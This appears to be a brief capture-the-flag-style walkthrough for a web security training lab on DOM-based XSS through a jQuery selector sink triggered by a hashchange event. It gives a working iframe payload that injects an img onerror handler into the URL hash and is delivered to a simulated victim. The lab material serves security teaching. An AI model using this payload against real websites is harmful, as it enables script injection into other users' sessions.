# Lab: DOM XSS in jQuery selector sink using a hashchange event

Inspect the homepage and notice the jquery selector used for the hash scroll functionality.

Open the exploit server and store the XSS: `<iframe src="https://ac201fa31f99a724c0a03e0500f10075.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

Deliver the exploit to the victim to complete the lab.